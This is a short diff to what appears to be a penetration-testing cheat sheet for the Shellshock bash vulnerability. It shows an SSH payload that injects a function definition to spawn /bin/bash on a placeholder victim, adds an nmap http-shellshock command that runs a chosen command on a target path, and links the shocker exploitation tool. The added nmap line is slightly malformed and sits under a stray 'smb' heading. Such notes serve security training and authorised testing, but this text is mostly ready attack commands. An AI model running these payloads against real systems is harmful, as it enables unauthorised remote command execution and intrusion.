@@ -15,6 +15,13 @@
 ```
 ssh username@$[victim_ip] '() { :;}; /bin/bash'
 ```
+
+### nmap
+### smb
+```
+nmap --script -p [victim_port] http-shellshock --script-args uri=[/vuln/path] cmd=[yours_command] [victim_ip]
+```
+
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 #### Tool
 ***shocker***: https://github.com/nccgroup/shocker
